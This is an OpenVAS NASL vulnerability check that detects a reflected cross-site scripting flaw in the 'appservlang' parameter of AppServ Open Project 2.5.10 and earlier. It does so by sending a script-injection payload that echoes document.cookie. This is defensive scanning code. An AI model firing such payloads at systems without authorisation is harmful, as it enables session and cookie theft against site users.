##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_appserv_open_project_apache_xss_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
#
# AppServ Open Project 'appservlang' Cross-site Scripting Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:appserv_open_project:appserv";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802429");
  script_version("$Revision: 11374 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-04-16 13:48:58 +0530 (Mon, 16 Apr 2012)");
  script_name("AppServ Open Project 'appservlang' Cross-site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_appserv_open_project_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("AppServ/installed");

  script_xref(name:"URL", value:"http://www.1337day.com/exploits/18036");
  script_xref(name:"URL", value:"http://www.allinfosec.com/2012/04/15/webapps-0day-apache-2-5-92-5-10win-xss-vulnerability-6/");

  script_tag(name:"insight", value:"The flaw is due to an input passed to the 'appservlang'
  parameter in 'index.php' is not properly sanitised before being returned to
  the user.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running AppServ Open Project and is prone to cross
  site scripting vulnerability.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary HTML and script code in a user's browser session in the context of
  an affected application.");
  script_tag(name:"affected", value:"AppServ Open Project Version 2.5.10 and prior");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + '/index.php?appservlang="><script>alert(document.cookie)</script>';

if( http_vuln_check( port:port, url:url, check_header:TRUE,
    pattern:"><script>alert\(document.cookie\)</script>",
    extra_check:"AppServ Open Project" ) ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
